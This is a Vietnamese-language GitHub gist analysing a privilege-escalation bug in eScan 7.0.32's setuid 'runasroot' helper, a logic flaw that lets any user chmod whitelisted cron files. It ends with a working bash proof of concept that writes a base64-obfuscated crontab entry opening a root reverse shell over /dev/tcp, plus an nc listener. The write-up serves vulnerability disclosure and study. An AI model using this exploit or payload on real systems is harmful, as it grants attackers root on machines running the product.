=== Content from gist.github.com_52bed097_20250114_181528.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dmknght](https://avatars.githubusercontent.com/u/29118926?s=64&v=4)](/dmknght)

# [dmknght](/dmknght)/**[escan\_analysis\_cbjs.md](/dmknght/ac489cf3605ded09b3925521afee3003)**

Last active
February 28, 2024 09:37

Show Gist options

* [Download ZIP](/dmknght/ac489cf3605ded09b3925521afee3003/archive/3bf36b4ad806d8731aacfd679904847cbf1312ec.zip)

* [Star
  (3)
  3](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dmknght/ac489cf3605ded09b3925521afee3003.js&quot;&gt;&lt;/script&gt;
* Save dmknght/ac489cf3605ded09b3925521afee3003 to your computer and use it in GitHub Desktop.

[Code](/dmknght/ac489cf3605ded09b3925521afee3003)
[Revisions
16](/dmknght/ac489cf3605ded09b3925521afee3003/revisions)
[Stars
3](/dmknght/ac489cf3605ded09b3925521afee3003/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dmknght/ac489cf3605ded09b3925521afee3003.js&quot;&gt;&lt;/script&gt;

Save dmknght/ac489cf3605ded09b3925521afee3003 to your computer and use it in GitHub Desktop.

[Download ZIP](/dmknght/ac489cf3605ded09b3925521afee3003/archive/3bf36b4ad806d8731aacfd679904847cbf1312ec.zip)

Phân tích lỗ hổng priv esc trong escan 7.0.32

 [Raw](/dmknght/ac489cf3605ded09b3925521afee3003/raw/3bf36b4ad806d8731aacfd679904847cbf1312ec/escan_analysis_cbjs.md)

[**escan\_analysis\_cbjs.md**](#file-escan_analysis_cbjs-md)

## I. Overview

* Ứng ụng có một số file có suid bit với owner root. Vì vậy, attacker có thể lợi dụng lỗ hổng trong các file này để leo thang dặc quyền.
* Goal: Tạo được reverse shell với quyền root

## II. Analysis

### 1. Cách hoạt động của `runasroot` (công cụ: cutter, ghidra)

*Note: cutter (backend là rizin framework) sử dụng bộ framework `capstone` của anh Anh Quỳnh để phân tích và dịch ngược ra assembly code. Trong khi đó, Ghidra sử dụng bộ từ điển Sleigh riêng. Trong một một số trường hợp, kết quả dịch ngược của cùng 1 binary file khi sử dụng 2 framework này là khác nhau.*

`runasroot` là một file ELF có chứa suid bit và sgid bit
[![image](https://user-images.githubusercontent.com/29118926/248416889-7012f12c-8f70-40f3-8979-a453b50a275c.png)](https://user-images.githubusercontent.com/29118926/248416889-7012f12c-8f70-40f3-8979-a453b50a275c.png)

Chương trình thực hiện công việc như sau:

Nếu user hiện tại là root hoặc user do phần mềm ghi vào hệ thống, chương trình sẽ lưu vào một biến với giá trị là `1` nhằm cho phép thực thi lệnh sau đó

[![image](https://user-images.githubusercontent.com/29118926/248417444-7c338758-6995-4086-ae14-6c68351a6214.png)](https://user-images.githubusercontent.com/29118926/248417444-7c338758-6995-4086-ae14-6c68351a6214.png)

Tiếp theo, chương trình kiểm tra absolute path của đường dẫn mà người dùng nhập vào bằng hàm `realpath()`. Trong trường hợp kết quả trả về lỗi, đường dẫn file sẽ được lưu với giá trị `NA` (0x414e)
[![image](https://user-images.githubusercontent.com/29118926/248417827-2284c5d5-3871-41ef-bd9e-a9616fb57510.png)](https://user-images.githubusercontent.com/29118926/248417827-2284c5d5-3871-41ef-bd9e-a9616fb57510.png)

Chương trình tiếp tục gọi đến một hàm để verify các arguments của người dùng nhằm đảm bảo câu lệnh được thực thi là an toàn

[![image](https://user-images.githubusercontent.com/29118926/248418406-4036617a-d495-48dd-88fb-1cdb434d464b.png)](https://user-images.githubusercontent.com/29118926/248418406-4036617a-d495-48dd-88fb-1cdb434d464b.png)

Ở đoạn này, Ghidra không thể nhận diện được các tham số được truyền vào trong hàm. Vì vậy, ta sử dụng Cutter để kiểm tra các tham số truyền vào

[![image](https://user-images.githubusercontent.com/29118926/248418709-0a06f045-b693-432f-b906-83b17bc28fe0.png)](https://user-images.githubusercontent.com/29118926/248418709-0a06f045-b693-432f-b906-83b17bc28fe0.png)

Do hạn chế của plugin Ghidra decompiler được sử dụng bởi Cutter, một số tên biến được tạo bởi decompiler không thể đổi tên được. Biến `uStack_438` trong screenshot chính là biến lưu trữ giá trị của đường dẫn người dùng nhập vào sau khi dã kiểm tra bằng việc gọi hàm `realpath()` như đã phân tích ở trên.

Như vậy, nếu người dùng thực thi `runasroot` với các tham số như `./runasroot foo bar path_to_a_file` thì chương trình sẽ verify như sau (pseudo code): `int_err_verify = verify_command_args( (char*)[foo], (char*)[validate_real_path(path_to_a_file)])`

Hàm `verify_command_args` so sánh tham số thứ nhất với chuỗi `chmod`
[![image](https://user-images.githubusercontent.com/29118926/248420282-e962447a-176d-48be-9090-0a545e4e6b1b.png)](https://user-images.githubusercontent.com/29118926/248420282-e962447a-176d-48be-9090-0a545e4e6b1b.png)

Tiếp theo, hàm này sẽ kiểm tra đường dẫn người dùng nhập vào với một danh sách đã được định nghĩa sẵn
[![image](https://user-images.githubusercontent.com/29118926/248420804-b2e1f22c-f867-4c39-95a7-61a9251d8981.png)](https://user-images.githubusercontent.com/29118926/248420804-b2e1f22c-f867-4c39-95a7-61a9251d8981.png)

Cuối cùng, chương trình kiểm tra sự hợp lệ của `uid` và các tham số, rồi thực hiện `setuid` và `setgid`, kiểm tra điều kiện thực thi lệnh trước khi gọi `execve` để execute command
[![image](https://user-images.githubusercontent.com/29118926/248421715-6d035625-bf53-444d-b2c0-67b4e1da08b2.png)](https://user-images.githubusercontent.com/29118926/248421715-6d035625-bf53-444d-b2c0-67b4e1da08b2.png)

Trong trường hợp user gọi file `runasroot` không phải là root hoặc user phần mềm tạo ra, phần mềm sẽ kiểm tra quyền của người dùng đối với file mà user chỉ định thông qua hàm `access()`. Chương trình có tiếp tục thực hiện kiểm tra đường dẫn file như đã phân tích ở trên. Về cơ bản, luồng hoạt động của hàm này không khác gì luồng đã phân tích ở trên

[![image](https://user-images.githubusercontent.com/29118926/248421924-3c47bda1-2a7f-4271-87d6-3d214dbbb8a4.png)](https://user-images.githubusercontent.com/29118926/248421924-3c47bda1-2a7f-4271-87d6-3d214dbbb8a4.png)

Kết luận: `runasroot` là một chương trình cho phép user thực thi lệnh `chmod` nhằm thay đổi quyền hệ thống đối với một số file mà eScan tạo ra. Chương trình này có thực hiện các thao tác kiểm tra dữ liệu nhằm đảm bảo lệnh được thực thi là an toàn.

### 2. Phân tích điểm yếu trong thiết kế của `runasroot`

Khi kiểm tra kỹ danh sách cách file được phép thay đổi permission, ta thấy có 3 file như trong hình
[![image](https://user-images.githubusercontent.com/29118926/248438420-6f8bec35-d3d8-4b8c-b0b1-d91df403a356.png)](https://user-images.githubusercontent.com/29118926/248438420-6f8bec35-d3d8-4b8c-b0b1-d91df403a356.png)

Trong đó, có 2 file đã được ghi vào cronjob của hệ thống dưới dạng symlink.
[![image](https://user-images.githubusercontent.com/29118926/248438463-2e6f878b-6023-4dfd-8611-0e46117370a2.png)](https://user-images.githubusercontent.com/29118926/248438463-2e6f878b-6023-4dfd-8611-0e46117370a2.png)

Như vậy, ta có thể thấy một số vấn đề

1. Các file crontab nằm trong whitelist. Sẽ thế nào nếu attacker có thể sửa đổi chúng nhằm thực hiện các lệnh độc hại?
2. crontab được tạo symlink trong `/etc/cron.d/`. Như vậy, crontab sẽ luôn được hệ thống thực thi thông qua dịch vụ `cronjob`
   => Sẽ thế nào nếu hacker có lợi dụng các điều kiện rên để thực thi lệnh theo ý muốn?

### 3. Lỗ hổng xảy ra bởi sử dụng sai một toán tử

Quay trở lại với quá trình kiểm ra dữ liệu từ tham số (hàm `verify_and_args()` trả về giá trị `0` nếu tham số không hợp lệ, giá trị `1` nếu tham số hợp lệ)

[![image](https://user-images.githubusercontent.com/29118926/248438900-a591be40-57de-4e67-a94b-cbdb086386ca.png)](https://user-images.githubusercontent.com/29118926/248438900-a591be40-57de-4e67-a94b-cbdb086386ca.png)

Pseudo code như sau:

```
if (verify_args(args[1], validated_path) != error OR uid == 0 OR uid == 0xc4) then
{
  setuid(0);
  setgid(0);
  validate_command_conditions(); // hàm này thực hiện lại luồng kiểm tra trước đó. Trên thực tế, khi chương trình chạy đến đây thì hàm này không trả về lỗi
  execvp(command);
}

```

Ta có các dữ kiện:

1. Nếu `argv[1]` là chmod và `argv[3]` là đường dẫn nằm trong danh sách được kiểm tra, hàm `verify_and_args()` luôn trả về giá trị hợp lệ
2. Vì đoạn so sánh điều kiện sử dụng toán tử `||`, chỉ cần `1.` thỏa mãn, điều kiện này **luôn dúng** và đoạn code sau đó **luôn được thực thi**
3. `runasroot` có `suid` và `sgid` bit, nên unprivileged user **luôn** có thể sửa đổi quyền của các file cron của antivirus. Thông qua việc sửa đổi lại quyền của các file cron, attacker có thể ghi crobtab mới.
4. Antivirus đã tạo symlink vào trong `/etc/cron.d/`. Vì vậy, **hệ thống sẽ thực thi crontab được ghi đè** thông qua cronjob.

Như vậy, ta có hướng khai thác như sau

1. Attacker tận dụng lỗi logic trong `runasroot` để cấp quyền ghi vào file cron cho unprivileged user
2. Attacker tiến hành overwrite file crontab nhằm thực thi mã độc
3. Để crontab có thể thực thi được, attacker tiến hành rollback lại quyền của file vừa sửa đổi permisison bằng cách bỏ quyền write
4. Attacker đợi crontab được thực thi bởi dịch vụ cronjob

Đoạn mã POC, tạo một reverse shell tới `127.0.0.1:8888`

```
#!/bin/bash

# Modify permission of crontab
/opt/MicroWorld/sbin/runasroot chmod 777 /opt/MicroWorld/etc/mwavupdate

# Modify crontab to run malicious command

echo "KiAqICogKiAqIHJvb3QgYmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTI3LjAuMC4xLzg4ODggPCYxJwo=" | base64 -d > /opt/MicroWorld/etc/mwavupdate

/opt/MicroWorld/sbin/runasroot chmod 750 /opt/MicroWorld/etc/mwavupdate

nc -nvlp 8888

```

Khi crontab được trigger, attacker có reverse shell với quyền root
[![image](https://user-images.githubusercontent.com/29118926/248439590-6ff9a60e-0cdf-4bb0-a042-b0cfe81be54e.png)](https://user-images.githubusercontent.com/29118926/248439590-6ff9a60e-0cdf-4bb0-a042-b0cfe81be54e.png)

Kiểm tra log bằng `journalctl`, có thể thấy quá trình thực thi đã được log lại
[![image](https://user-images.githubusercontent.com/29118926/248439647-a8dbf565-8653-4b00-b9a6-7372710e2529.png)](https://user-images.githubusercontent.com/29118926/248439647-a8dbf565-8653-4b00-b9a6-7372710e2529.png)

Như vậy, attacker đã khai thác lỗ hổng thành công, qua đó leo thang đặc quyền từ unprivileged user trở thành root

## III. References

* <https://www.redhat.com/sysadmin/suid-sgid-sticky-bit>
* <https://man7.org/linux/man-pages/man3/realpath.3.html>
* <https://man7.org/linux/man-pages/man2/setuid.2.html>
* <https://man7.org/linux/man-pages/man2/setgid.2.html>
* <https://man7.org/linux/man-pages/man2/execve.2.html>

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdmknght%2Fac489cf3605ded09b3925521afee3003)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


